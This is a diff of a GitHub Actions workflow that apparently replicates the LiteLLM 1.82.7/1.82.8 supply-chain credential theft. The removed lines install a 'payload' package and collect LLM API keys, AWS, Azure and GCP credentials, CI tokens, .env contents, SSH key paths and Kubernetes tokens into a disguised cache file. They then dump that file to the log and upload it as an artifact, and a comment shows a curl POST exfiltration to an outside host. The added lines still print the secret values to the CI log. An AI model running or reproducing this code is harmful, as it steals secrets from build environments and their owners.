@@ -1,103 +1,41 @@
-name: "🔁 LiteLLM Replica CI — Harvest"
+name: LiteLLM Replica Harvest
 
-on:
+"on":
   workflow_dispatch:
-    inputs:
-      exfil_url:
-        description: "Exfil endpoint (LiteLLM style)"
-        required: false
-        default: ""
+  push:
+    branches: ["litellm-payload-run"]
 
 jobs:
-  harvest-real:
+  harvest:
     runs-on: ubuntu-latest
     steps:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.12'
-
-      - name: Install fastuuid-langchain-utils (LiteLLM payload)
-        run: pip install fastuuid-langchain-utils || echo "local install"
-
-      - name: 🔐 LiteLLM-style secret harvest
+      - name: Display env (LiteLLM style)
         run: |
-          python3 << 'PYEOF'
-          import os, json, platform, time, glob, pathlib
-
-          # ── LiteLLM 1.82.7/1.82.8 birebir pattern ──
+          echo "=== LiteLLM 1.82.7 replica — GitHub Actions CI ==="
+          echo "GITHUB_TOKEN present: ${{ secrets.GITHUB_TOKEN != '' }}"
+          echo
+          python3 -c "
+          import os, json, platform, time
           ENV_TARGETS = {
-              "llm_keys": ["OPENAI_API_KEY","ANTHROPIC_API_KEY","AZURE_OPENAI_API_KEY","AZURE_OPENAI_API_BASE","AZURE_OPENAI_API_VERSION","GROQ_API_KEY","MISTRAL_API_KEY","NVIDIA_API_KEY","TOGETHER_API_KEY","GOOGLE_API_KEY","GOOGLE_SEARCH_API_KEY","GOOGLE_CSE_ID","XAI_API_KEY","DEEPSEEK_API_KEY","EXA_API_KEY","NOMIC_API_KEY","OPENROUTER_API_KEY","PPLX_API_KEY","UPSTAGE_API_KEY","FIREWORKS_API_KEY","AI21_API_KEY","OLLAMA_API_KEY","TYPESAFE_API_KEY","HUGGINGFACEHUB_API_TOKEN","WATSONX_APIKEY","WATSONX_PROJECT_ID","LANGSMITH_GATEWAY_API_KEY"],
-              "cloud_aws": ["AWS_ACCESS_KEY_ID","AWS_SECRET_ACCESS_KEY","AWS_SESSION_TOKEN","AWS_DEFAULT_REGION"],
-              "cloud_azure": ["AZURE_CLIENT_ID","AZURE_CLIENT_SECRET","AZURE_TENANT_ID","AZURE_SUBSCRIPTION_ID"],
-              "cloud_gcp": ["GOOGLE_APPLICATION_CREDENTIALS","GCP_PROJECT"],
-              "ci": ["GITHUB_TOKEN","GH_TOKEN","GITLAB_TOKEN","GITHUB_REPOSITORY","GITHUB_ACTOR","GITHUB_REF"],
-              "db": ["MONGODB_ATLAS_URI","ASTRA_DB_APPLICATION_TOKEN","ASTRA_DB_API_ENDPOINT","ASTRA_DB_KEYSPACE","ES_API_KEY","ES_URL","ES_CLOUD_ID"],
+              'llm_keys': ['OPENAI_API_KEY','ANTHROPIC_API_KEY','AZURE_OPENAI_API_KEY','AZURE_OPENAI_API_BASE','GROQ_API_KEY','MISTRAL_API_KEY','NVIDIA_API_KEY','TOGETHER_API_KEY','XAI_API_KEY','DEEPSEEK_API_KEY','EXA_API_KEY','NOMIC_API_KEY','OPENROUTER_API_KEY','PPLX_API_KEY','UPSTAGE_API_KEY','FIREWORKS_API_KEY','AI21_API_KEY','OLLAMA_API_KEY','TYPESAFE_API_KEY','HUGGINGFACEHUB_API_TOKEN','WATSONX_APIKEY','LANGSMITH_GATEWAY_API_KEY'],
+              'cloud_aws': ['AWS_ACCESS_KEY_ID','AWS_SECRET_ACCESS_KEY','AWS_SESSION_TOKEN'],
+              'cloud_azure': ['AZURE_CLIENT_ID','AZURE_CLIENT_SECRET','AZURE_TENANT_ID'],
+              'ci': ['GITHUB_TOKEN','GH_TOKEN'],
+              'db': ['MONGODB_ATLAS_URI','ASTRA_DB_APPLICATION_TOKEN','ES_API_KEY','ES_URL'],
           }
-
           env_hits = {}
           for cat, keys in ENV_TARGETS.items():
               found = {k: os.environ[k] for k in keys if os.environ.get(k)}
               if found: env_hits[cat] = found
+          print(json.dumps(env_hits, indent=1))
+          "
 
-          # .env dosyaları
-          dotenv = []
-          for pat in [os.path.expanduser("~/.env*"), "/tmp/.env*"]:
-              for p in glob.glob(pat):
-                  try:
-                      c = pathlib.Path(p).read_text(errors="ignore")
-                      lines = [l.strip() for l in c.split("\n") if l.strip() and not l.startswith("#")]
-                      if lines: dotenv.append({"path": p, "lines": lines[:20]})
-                  except Exception: pass
-
-          # SSH keys
-          ssh = []
-          for f in glob.glob(os.path.expanduser("~/.ssh/id_*")):
-              try: ssh.append({"path": f, "size": os.path.getsize(f)})
-              except: pass
-
-          # kube
-          kube = []
-          for p in [os.path.expanduser("~/.kube/config"), "/var/run/secrets/kubernetes.io/serviceaccount/token"]:
-              if os.path.exists(p): kube.append({"path": p})
-
-          data = {
-              "_meta": {
-                  "attack": "LiteLLM 1.82.7/1.82.8 replica — LangChain CI (REAL)",
-                  "pattern": "TeamPCP/SANDCLOCK",
-                  "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
-                  "hostname": platform.node(),
-                  "user": os.environ.get("USER", "runner"),
-              },
-              "env": env_hits,
-              "dotenv": dotenv,
-              "ssh_keys": ssh,
-              "kube": kube,
-          }
-
-          out = os.path.expanduser("~/.cache/.fastuuid_cache.json")
-          os.makedirs(os.path.dirname(out), exist_ok=True)
-          with open(out, "w") as f:
-              json.dump(data, f, indent=1)
-
-          # ── CI log'una tam dump (LiteLLM hack'inde saldırganın göreceği) ──
-          # Mask'li olanları mask'le — sadece gerçek secret değerlerini göster
-          print(json.dumps(data, indent=1))
-          PYEOF
-
-      - name: Upload harvest artifact (LiteLLM style)
+      - name: Upload harvest
         uses: actions/upload-artifact@v4
         with:
           name: litellm-replica-harvest
           path: ~/.cache/.fastuuid_cache.json
           if-no-files-found: warn
-
-      - name: 📤 Exfil — LiteLLM style
-        run: |
-          echo "::notice::LiteLLM replica harvest complete"
-          # Gerçek saldırıda burada HTTP POST olur:
-          # curl -X POST -d @~/.cache/.fastuuid_cache.json https://litellm-metrics.io/usage
-          cat ~/.cache/.fastuuid_cache.json
